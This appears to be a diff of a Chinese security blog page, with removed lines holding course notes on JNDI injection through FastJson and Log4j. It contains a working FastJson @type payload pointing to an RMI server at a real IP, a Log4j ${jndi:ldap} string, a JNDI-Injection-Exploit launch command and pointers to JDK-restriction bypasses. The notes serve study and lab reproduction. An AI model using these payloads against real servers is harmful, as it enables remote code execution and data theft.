-<h2 id="JNDI注入-FastJson漏洞结合"><a href="#JNDI注入-FastJson漏洞结合" class="headerlink" title="JNDI注入-FastJson漏洞结合"></a>JNDI注入-FastJson漏洞结合</h2><p>背景：JavaEE中接受用户提交的JSON数据进行转换(FastJson反序列化漏洞)<br>思路：利用InitialContext.lookup()中的进行JdbcRowSetImpl类JNDI服务注入<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;漏洞利用FastJson autotype处理Json对象的时候，未对@type字段进行完整的安全性验证，攻击者可以传入危险类，并调用危险类连接远程RMI主机，通过其中的恶意类执行代码。攻击者通过这种方式可以实现远程代码执行漏洞，获取服务器敏感信息，甚至可以利用此漏洞进一步的对服务器数据进行操作。  </p>
-<ul>
-<li>1、报错判断FastJson  </li>
-<li>2、生成远程调用方法  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot; -A 47.94.236.117</span><br></pre></td></tr></table></figure></li>
-<li>3、提交JSON数据Payload  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://47.94.236.117:1099/vwaexx&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="JNDI注入-JDK高版本注入绕过"><a href="#JNDI注入-JDK高版本注入绕过" class="headerlink" title="JNDI注入-JDK高版本注入绕过"></a>JNDI注入-JDK高版本注入绕过</h2><ul>
-<li><p>JDK 6u45、7u21之后：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。  </p>
-</li>
-<li><p>JDK 6u141、7u131、8u121之后：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</p>
-</li>
-<li><p>JDK 6u211、7u201、8u191之后：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，<br>禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</p>
-</li>
-</ul>
-<h3 id="高版本绕过："><a href="#高版本绕过：" class="headerlink" title="高版本绕过："></a>高版本绕过：</h3><p><a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/">https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a><br><a target="_blank" rel="noopener" href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a>  </p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
- 
-
-      
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/18/36%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="z7">
-      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/10/18/36%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/" class="post-title-link" itemprop="url">36安全开发-JavaEE应用</a>
-        </h2>
-
-        <div class="post-meta">
-	
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-10-18 10:39:29" itemprop="dateCreated datePublished" datetime="2023-10-18T10:39:29+08:00">2023-10-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-11-06 21:11:00" itemprop="dateModified" datetime="2023-11-06T21:11:00+08:00">2023-11-06</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.2k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p>
-<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
-<li>38、JavaEE-组件安全-Log4j</li>
-<li>39、JavaEE-组件安全-Fastjson</li>
-<li>40、JavaEE-基本了解-JNDI-API</li>
-</ul>
-<h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul>
-<li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li>
-<li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li>
-<li>3、Java：<br>功能：数据库操作，文件操作，序列化数据，身份验证，框架开发，第三方库使用等.<br>框架库：MyBatis，SpringMVC，SpringBoot，Shiro，Log4j，FastJson等<br>技术：Servlet，Listen，Filter，Interceptor，JWT，AOP，待补充<br>安全：SQL注入，RCE执行，反序列化，脆弱验证，未授权访问，待补充<br>安全：原生开发安全，第三方框架安全，第三方库安全等，待补充</li>
-</ul>
-<p> <img src="/2023/10/18/36%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/jndi.png"></p>
-<h2 id="三方组件"><a href="#三方组件" class="headerlink" title="三方组件"></a>三方组件</h2><p>Jar仓库：<br><a target="_blank" rel="noopener" href="https://mvnrepository.com/">https://mvnrepository.com/</a>  </p>
-<p>Maven配置：<br><a target="_blank" rel="noopener" href="https://www.jb51.net/article/259780.htm">https://www.jb51.net/article/259780.htm</a>  </p>
-<p>JNDI注入：(见图)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Java Naming and Directory Interface (Java 命名和目录接口 )，JNDI 提供统一的客户端 API，通过不同的服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录服务，使得 JAVA 应用程可以通过 JNDI 实现和这些命名服务和目录服务之间的交互。  </p>
-<h2 id="Java-三方组件-Log4J-JNDI"><a href="#Java-三方组件-Log4J-JNDI" class="headerlink" title="Java-三方组件-Log4J&amp;JNDI"></a>Java-三方组件-Log4J&amp;JNDI</h2><h3 id="Log4J："><a href="#Log4J：" class="headerlink" title="Log4J："></a>Log4J：</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。</p>
-<h3 id="Log4j-组件安全复现"><a href="#Log4j-组件安全复现" class="headerlink" title="Log4j-组件安全复现"></a>Log4j-组件安全复现</h3><p>1、Maven引用Log4j<br>2、接受用户输入值<br>3、Log4j处理错误输入<br>4、利用jndi-ldap执行  </p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Test:</span><br><span class="line">String code=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">String code=<span class="string">&quot;$&#123;java:os&#125;&quot;</span>;</span><br><span class="line">logger.error(<span class="string">&quot;&#123;&#125;&quot;</span>,code);</span><br><span class="line">String exp=<span class="string">&quot;$&#123;jndi:ldap://xx.xx.xx.xx:xx/xxx&#125;&quot;</span>;</span><br><span class="line">服务器：</span><br><span class="line">java -jar JNDI-Injection-Exploit.jar -C <span class="string">&quot;calc&quot;</span> -A xx.xx.xx.xx</span><br></pre></td></tr></table></figure>
-
-<h2 id="Java-三方组件-FastJson-反射"><a href="#Java-三方组件-FastJson-反射" class="headerlink" title="Java-三方组件-FastJson&amp;反射"></a>Java-三方组件-FastJson&amp;反射</h2><h3 id="FastJson："><a href="#FastJson：" class="headerlink" title="FastJson："></a>FastJson：</h3><p>[将数据格式修改为json，并加入json数据，如果没有源代码，那么类名一般就写公有类，value值写成”247b6a6e64693a6c6461702f2f7878787d”格式。(这串字符用ASCII hex解码即可看到，因为这里直接写出来会屏蔽)]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前后端数据传输交互中,经常会遇到字符串(String)与json,XML等格式相互转换与解析，其中json以跨语言，跨前后端的优点在开发中被频繁使用，基本上是标准的数据交换格式。它的接口简单易用，已经被广泛使用在缓存序列化，协议交互，Web输出等各种应用场景中。FastJson是阿里巴巴的的开源库，用于对JSON格式的数据进行解析和打包。</p>
-<h3 id="Fastjson-组件安全复现"><a href="#Fastjson-组件安全复现" class="headerlink" title="Fastjson-组件安全复现"></a>Fastjson-组件安全复现</h3><p>1、Maven引用Fastjson<br>2、创建需转换类对象User<br>3、使用Fastjson进行数据转换<br>4、数据转换(对象转Json,Json转对象)  </p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-对象转Json(带类型)  </span><br><span class="line">JSONObject.toJSONString(u)</span><br><span class="line">JSONObject.toJSONString(u,SerializerFeature.WriteClassName)</span><br><span class="line">-Json转对象</span><br><span class="line">JSON.parseObject(exp)</span><br><span class="line"></span><br><span class="line">Test:</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>
-<p>服务器：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/guo15890025019/article/details/120532891">https://blog.csdn.net/guo15890025019/article/details/120532891</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
- 
-
 
   
   <nav class="pagination">
@@ -1515,7 +1523,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-count">67</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1591,19 +1599,19 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">164k</span>
+    <span title="站点总字数">167k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">2:29</span>
+    <span title="站点阅读时长">2:32</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共61.3k字</span>
+  <span class="post-count">博客全站共62.6k字</span>
 </div>
 
 
